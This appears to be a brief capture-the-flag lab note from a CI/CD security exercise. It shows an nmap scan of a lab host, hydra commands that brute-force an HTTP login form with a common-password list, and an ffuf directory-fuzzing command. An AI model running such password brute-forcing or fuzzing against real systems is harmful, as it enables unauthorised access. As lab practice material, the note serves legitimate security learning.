---
share: true
---

NMap
```
root@ip-10-10-213-142:~# nmap 10.10.189.80
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-07 00:11 GMT
Nmap scan report for 10.10.189.80
Host is up (0.00048s latency).
Not shown: 995 closed ports
PORT   STATE SERVICE
7/tcp  open  echo
21/tcp open  ftp
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
MAC Address: 02:0A:A2:AB:CF:9B (Unknown)
```

Need to find telnet login
Tried default password incorrect

attempted brute forcing with hydra
`hydra -l admin -P ./SecLists/Passwords/500-worst-passwords.txt `

`hydra -l admin -P ./SecLists/Passwords/500-worst-passwords.txt 10.10.189.80:61337 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"`


brute force the submain list
`root@ip-10-10-213-142:~# ffuf -w ./SecLists/Discovery/DNS/namelist.txt -u http://10.10.189.80:61337/FUZZ`

![[./CTFWriteups/CICD and Build Security/Pasted image 20250206211613.png|Pasted image 20250206211613.png]]


